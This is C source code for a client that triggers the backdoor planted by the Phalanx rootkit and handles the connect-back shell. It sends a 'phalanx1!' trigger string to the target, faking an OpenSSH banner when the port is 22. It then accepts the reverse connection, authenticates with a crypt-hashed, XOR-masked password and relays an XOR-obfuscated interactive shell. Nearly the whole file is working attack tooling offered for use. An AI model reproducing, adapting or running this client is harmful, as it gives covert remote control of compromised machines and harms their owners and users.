/*
* client to trigger the backdoor in phalanx and handle the connectback shell
*
* uses -lcrypt
* 
* %rebel% oct 2005
* rebel@pulltheplug.org
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/stat.h>
#include <sys/timeb.h>
#include <fcntl.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <signal.h>
#include <sys/types.h>
#include <termios.h>
#include "conf.h"

#define MOLEST(x) kill(x,SIGKILL);
struct termios oldterm, newterm;

//patented by me
//extremely advanced
//do not view this code unless you are wearing
//protective gear and goggles otherwise you might
//die of the incredible awesomeness of this function

unsigned char xorkeys[5] = { 'p', 'u', 'n', 'g', 0 };

void
ultraxor (char *buf, int count)
{
  char *p;
  int x, y;

  for (y = 0; y < 4; y++)
    for (p = buf, x = 0; x < count; x++, p++)
      *p = *p ^ xorkeys[y];

}


void
die_motherfucker_die (void)
{
  fprintf (stderr, "connection lost. have a wonderful day\n");
  tcsetattr (0, TCSAFLUSH, &oldterm);
  exit (1);
}

void
usage (char *av)
{
  printf
    ("usage: %s -h <host> -p <port> -l [listenport] -i [connectback ip]\n",
     av);
  exit (1);
}

void
trigger (char *host, int port, char *server, int listenport)
{
  char buf[52];
  int sd, rc, x;
  struct sockaddr_in localAddr, servAddr;
  struct hostent *h;


  h = gethostbyname (host);
  if (h == NULL)
    {
      fprintf (stderr, "unknown host %s\n", host);
      exit (1);
    }

  servAddr.sin_family = h->h_addrtype;
  memcpy ((char *) &servAddr.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
  servAddr.sin_port = htons (port);
  sd = socket (AF_INET, SOCK_STREAM, 0);

  if (sd < 0)
    {
      fprintf (stderr, "socket() failed\n");
      exit (1);
    }

  localAddr.sin_family = AF_INET;
  localAddr.sin_addr.s_addr = htonl (INADDR_ANY);
  localAddr.sin_port = htons (0);

  rc = bind (sd, (struct sockaddr *) &localAddr, sizeof (localAddr));
  if (rc < 0)
    {
      fprintf (stderr, "bind() failed\n");
      exit (1);
    }

  rc = connect (sd, (struct sockaddr *) &servAddr, sizeof (servAddr));
  if (rc < 0)
    {
      fprintf (stderr, "connect() failed\n");
      exit (1);
    }

  buf[51] = '\0';


  sprintf (buf, "phalanx1!%s!%d", server, listenport);
  memset (buf + strlen (buf), '+', 10);
  buf[31] = '\n';

//ssh needs some identification before it will launch a read(fd,buf,8192);
  if (port == 22)
    write (sd, "SSH-2.0-OpenSSH_3.8.1p1\n",
	   strlen ("SSH-2.0-OpenSSH_3.8.1p1\n"));

  usleep (500000);
  x = write (sd, buf, 32);

  if (x < 30)
    {
      fprintf (stderr, "write() failed\n");
      exit (1);
    }

  while (1)
    {
      write (2, ".", 1);
      usleep (700000);
    }

}


int
main (int argc, char **argv)
{
  struct sockaddr_in sa;
  int fd, fd2, cnt, rc;
  fd_set rfds;
  int retval;
  char buf[16500], ip[32], *host = NULL, *kebab;
  int listenport, port = 0, child;
  FILE *proc;

  printf ("phalanx client - rebel nov 05\n");


  srand (time (NULL));

  listenport = rand () % 50000;
  listenport += 5000;

  proc =
    (FILE *)
    popen ("/sbin/ifconfig|grep inet|head -1|awk '{print $2}'|cut -f 2 -d :",
	   "r");
  fgets (ip, 32, proc);
  pclose (proc);

  ip[strlen (ip) - 1] = '\0';

  while ((cnt = getopt (argc, argv, "h:l:p:i:")) != EOF)
    {
      switch (cnt)
	{
	case 'h':
	  host = optarg;
	  break;
	case 'l':
	  listenport = atoi (optarg);
	  break;
	case 'p':
	  port = atoi (optarg);
	  break;
	case 'i':
	  strncpy (ip, optarg, 30);
	  break;
	default:
	  usage (argv[0]);
	  break;
	}
    }

  if (host == NULL || port == 0)
    usage (argv[0]);


  fd = socket (PF_INET, SOCK_STREAM, 0);
  sa.sin_family = AF_INET;
  sa.sin_addr.s_addr = INADDR_ANY;

  sa.sin_port = htons (listenport);
  rc = bind (fd, (struct sockaddr *) &sa, sizeof (struct sockaddr));
  if (rc < 0)
    {
      fprintf (stderr, "bind() failed\n");
      exit (1);
    }


  listen (fd, 5);

  printf ("listening on %s:%d..", ip, listenport);
  fflush (stdout);
  if ((child = fork ()) == 0)
    {
      close (1);
      trigger (host, port, ip, listenport);
      exit (0);
    }

  fd2 = accept (fd, NULL, 0);
  MOLEST (child);		//THAT'S NOT RIGHT
  printf ("\n");

  kebab = getpass ("password: ");
  kebab = (char *) crypt (kebab, SALT);
  ultraxor (kebab, 13);
  write (fd2, kebab, 13);

  tcgetattr (0, &oldterm);
  newterm = oldterm;
  newterm.c_lflag &= ~(ICANON | ECHO | ISIG);
  newterm.c_iflag &= ~(IXON | IXOFF);
  tcsetattr (0, TCSAFLUSH, &newterm);


//write(fd2,"uname -a\n",9);

  while (1)
    {
      FD_ZERO (&rfds);
      FD_SET (0, &rfds);
      FD_SET (fd2, &rfds);

      retval = select (8, &rfds, NULL, NULL, NULL);
      if (retval == -1)
	break;

      if (FD_ISSET (0, &rfds))
	{
	  retval = read (0, buf, 16000);
	  if (retval <= 0)
	    die_motherfucker_die ();

//uncomment if you want the key to change during the connection
/*xorkeys[0] = (xorkeys[0] + retval) % 255;
xorkeys[1] = (xorkeys[1] + (retval * 8)) % 255;
xorkeys[2] = (xorkeys[2] + (retval * 2)) % 255;
xorkeys[3] = (xorkeys[3] + (retval * 14)) % 255;*/

	  ultraxor (buf, retval);
	  write (fd2, buf, retval);
	}

      if (FD_ISSET (fd2, &rfds))
	{
	  retval = read (fd2, buf, 16000);
	  if (retval <= 0)
	    die_motherfucker_die ();
	  ultraxor (buf, retval);
	  write (1, buf, retval);
	}


    }

  tcsetattr (0, TCSAFLUSH, &oldterm);
}
